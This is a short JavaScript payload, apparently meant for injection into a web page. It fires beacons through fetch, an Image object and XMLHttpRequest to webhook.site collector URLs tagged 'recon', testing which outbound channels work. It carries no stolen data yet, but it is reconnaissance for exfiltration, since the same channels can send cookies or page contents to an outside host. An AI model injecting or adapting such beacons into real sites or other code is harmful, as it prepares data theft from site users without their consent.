(function() {
  // Test 1: fetch
  fetch('https://webhook.site/4c23dbe0-c117-4105-a0e6-bcfededf662b/recon?test=fetch', {
    method: 'GET',
    mode: 'no-cors'
  });

  // Test 2: Image
  new Image().src = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=img&t=' + Date.now();

  // Test 3: XHR clásico
  var x = new XMLHttpRequest();
  x.open('GET', 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=xhr', true);
  x.send();
})();
